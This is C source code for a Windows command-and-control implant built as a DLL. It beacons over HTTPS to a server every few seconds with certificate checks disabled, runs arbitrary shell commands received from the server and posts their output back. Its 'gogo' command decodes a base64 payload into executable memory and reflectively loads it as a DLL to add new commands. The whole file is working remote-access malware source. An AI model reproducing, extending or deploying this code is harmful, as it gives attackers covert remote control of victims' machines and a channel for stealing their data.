// cl.exe /LD /MD main.c gadget_loader.c /Fo.\obj\ /O2 /Ot /GL

#include "common.h"
#include <string.h>
#include <Windows.h>

#include "commandlist.h"
#include "base64.h"

#define CURL_STATICLIB
#include "tinycurl\include\curl\curl.h"

// Library for MessageBox
#pragma comment(lib, "user32.lib")

// Libraries needed for tinycurl
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "normaliz.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "tinycurl\\lib\\libcurl_a.lib")

// Function declarations
int   main(void);
void  jitter_connect(void);
void  command_loop(void);
char* execute_command(const char *cmd);
void  update_curl_headers(void);
__declspec(dllexport) void MainExport(void);
// Built-in functions
char* CMD_exec(char* args);
char* CMD_shell(char* args);
char* CMD_gogo(char* args);
char* CMD_quit(char* args);
char* CMD_install(char* args);

// This is the list of available commands the client can run
CommandNode* commandList = NULL;

// Global used to store response sent back to the server
// For example: recv: `exec ls`; STORED_RESPONSE: ".bashrc myfile.txt etc..."
char* STORED_RESPONSE = NULL;

// Commands header info
char* COMMANDS_HEADER = "Commands: ";   // This is the header for commandsList
char* AVAILABLE_COMMANDS = NULL;        // This sends commandsList to the server

// Clientid header info
char* CLIENTID = "clientid: 10"; // TODO: It needs to be generated on the client, not static

// Sent back to the server, tells it what command the results are for
// For `exec` calls, will be the command like "ls" or "dir"
char* CURRENT_COMMAND = NULL;

// This is the linked list of headers supplied to curl
struct curl_slist *CLIENT_HEADERS = NULL;

// Built-in Commands
char* CMD_exec(char* args)
{
    char* tmp = execute_command(args);
    debugf("Command: %s\nResult: %s\n", args, tmp);
    return tmp;
}

char* CMD_shell(char* args)
{
    MessageBox(NULL, "Received shell command", "Shell Command", MB_OK);
    return NULL;
}

char* CMD_gogo(char* args)
{
    debugf("Received gogo command with arguments: %s\n", args);
    size_t gadget_len = 0;
    unsigned char* gadget = base64_decode(args, strlen(args), &gadget_len);
    LPVOID lpBuffer = NULL;
    HANDLE hModule  = NULL;

    if (gadget == NULL)
        return NULL;
    
    debugf("gadget: %p", gadget);
    debugf("gadget length: %zu\n", gadget_len);
    lpBuffer = VirtualAlloc(NULL, gadget_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if( !lpBuffer )
		BREAK_WITH_ERROR( "Failed to allocate space" );

    memcpy(lpBuffer, gadget, gadget_len);
    debugf("memcpy\n");
    fflush(stdout);

    CommandNodePointer func;
    hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
	if( !hModule )
		BREAK_WITH_ERROR( "Failed to inject the DLL" );
    
    CommandNode* tester = func();
    debugf("Tester: %s\n", tester->command);

    insertCommandNode(&commandList, createCommandNode(tester->command, tester->function));
    if (AVAILABLE_COMMANDS) {free(AVAILABLE_COMMANDS); AVAILABLE_COMMANDS=NULL;}
    AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
    update_curl_headers();

    debugf("Inserted command!\n");

    return NULL;
}

char* CMD_quit(char* args)
{
    exit(0);
}

char* CMD_install(char* args)
{
    FILE *fp = fopen("installed.txt", "w");
    if (fp != NULL)
    {
        fprintf(fp, "Installed\n");
        fclose(fp);
    }
    return NULL;
}

// Callback function to handle incoming data
void check_response(char* data)
{   
    // Find the first space character to separate command and arguments
    char *space_pos = strchr(data, ' ');

    // Replace space with null byte to separate command and arguments
    if (space_pos != NULL)
    {
        *space_pos = '\0';
    }
    // Calculate pointers for command and arguments
    char *command = data;
    char *arguments = space_pos + 1;

    CommandNode* commandnode = findCommandNode(commandList, command);

    if (commandnode != NULL)
    {
        if (!strcmp(commandnode->command, "exec"))
        {
            CURRENT_COMMAND = strdup(arguments);
        }
        else
        {
            CURRENT_COMMAND = strdup(commandnode->command);
        }
        STORED_RESPONSE = commandnode->function(arguments);
    }
}

int main(void)
{
    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Initialize built-in commands
    insertCommandNode(&commandList, createCommandNode("exec", CMD_exec));
    insertCommandNode(&commandList, createCommandNode("shell", CMD_shell));
    insertCommandNode(&commandList, createCommandNode("gogo", CMD_gogo));
    insertCommandNode(&commandList, createCommandNode("quit", CMD_quit));
    insertCommandNode(&commandList, createCommandNode("install", CMD_install));

    // Initialize available commands that the server returns; updated in `gogo` command
    debugf("Getting commands\n");
    AVAILABLE_COMMANDS = getCommands(commandList, COMMANDS_HEADER);
    update_curl_headers();

    // Start C2
    debugf("Starting C2\n");

    jitter_connect();

    // End
    curl_global_cleanup();
}

void jitter_connect()
{
    // TODO: Make this jitter instead of a constant time.
    // Seperate initial connect from interactive connection?
    // Initial connect will probably be handled by a wrapper program, in case of crashes in this one
    while (1)
    {
        command_loop();
        Sleep(5 * 1000);  
    }
}

// Callback function to write received data to a dynamically growing buffer
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userdata;
    
    // Reallocate memory to fit the new data
    char *ptr_realloc = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr_realloc == NULL)
    {
        debugf("Memory allocation failed\n");
        return 0;
    }
    
    mem->memory = ptr_realloc;
    memcpy(&(mem->memory[mem->size]), ptr, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = '\0';
    
    return realsize;
}

// Utilizes numerous globals. Potential TODO: Single struct?
void update_curl_headers(void)
{
    if (CLIENT_HEADERS)
    {
        curl_slist_free_all(CLIENT_HEADERS);
    }
    CLIENT_HEADERS = curl_slist_append(NULL, CLIENTID);
    curl_slist_append(CLIENT_HEADERS, AVAILABLE_COMMANDS); // return ignored
    if (CURRENT_COMMAND)
    {
        char command_hdr[] = "command: ";
        size_t buffer_size = strlen(CURRENT_COMMAND)+sizeof(command_hdr) + 1;
        char* command_buffer = calloc(buffer_size, 1);
        snprintf(command_buffer, buffer_size, "%s%s", command_hdr, CURRENT_COMMAND);
        curl_slist_append(CLIENT_HEADERS, command_buffer);
    }
}

void command_loop(void)
{
    struct MemoryStruct chunk;

    // Stuff that will need to be free'd
    CURL *curl = NULL;
    unsigned char free_response = 0;
    chunk.memory = calloc(1,1);

    // Initialize the "chunk" used to receive data
    if (chunk.memory == NULL)
    {
        debugf("Memory allocation failed\n");
        return;
    }
    chunk.size = 0;  // No data yet
    
    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/");      // TODO: Round-robin servers

        // For errors
        char errbuf[CURL_ERROR_SIZE];
        curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
        errbuf[0] = 0;

        // If STORED_RESPONSE is not NULL, we have data to send to the server
        if (STORED_RESPONSE != NULL)
        {
            debugf("sending response: %s\n", STORED_RESPONSE);
            // Does not create a copy of data, so mark that it needs to be free'd
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, STORED_RESPONSE);
            free_response = 1;
            // Update headers with current command
            update_curl_headers();
        }
        else
        {
            // No data to send to server, so perform a GET request
            // curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
        }

        // Set headers
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, CLIENT_HEADERS);

        // Disable SSL certificate verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        // Specify the callback function to handle the response data
        // curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        // If sent a response, free the response and remove the command header
        // This happens here before we check the `current` response from server
        if (free_response)
        {
            free(STORED_RESPONSE);
            free(CURRENT_COMMAND);
            free_response = 0;
            STORED_RESPONSE = NULL;
            CURRENT_COMMAND = NULL;
            update_curl_headers();
        }

        if (res != CURLE_OK)
        {
            size_t len = strlen(errbuf);
            debugf("\nlibcurl: (%d) ", res);
            if(len)
            {
                debugf("IF:%s\n", errbuf);
            }
            else
            {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                debugf("ELSE:%s\n", curl_easy_strerror(res));
                debugf("Response code: %ld\n", response_code);
            }
        }
        else
        {
            // Don't assume empty memory was assigned to chunk.memory, so check chunk.size
            if (chunk.size)
            {
                check_response(chunk.memory);
            }
        }

        // Cleanup
        debugf("performing curl cleanup.\n");
        curl_easy_cleanup(curl);
    }
    debugf("Freeing stuff.\n");
    if (chunk.memory)  {free(chunk.memory);}
    debugf("Done with loop\n");
}

// Execute a command and capture its output. Cross-compilable for both Unix and Windows
char *execute_command(const char *cmd)
{
    #ifdef _WIN32
    #define popen _popen
    #define pclose _pclose
    #endif
    FILE *fp;
    char *result = NULL;
    char *tmp = NULL;
    char line[1024];
    size_t len = 0;
    size_t total_size = 0;

    // Open the command for reading
    fp = popen(cmd, "r");
    if (fp == NULL)
    {
        debugf("Failed to run command\n");
        return NULL;
    }

    // Read output line by line and dynamically allocate memory
    while (fgets(line, sizeof(line), fp) != NULL)
    {
        size_t line_length = strlen(line);
        tmp = realloc(result, total_size + line_length + 1);
        if (tmp == NULL)
        {
            debugf("Memory allocation failed\n");
            pclose(fp);
            return result;
        }
        result = tmp;
        strcpy(result + total_size, line);
        total_size += line_length;
    }

    // Clean up
    pclose(fp);
    return result;
}

__declspec(dllexport) void MainExport(void)
{
    main();
}
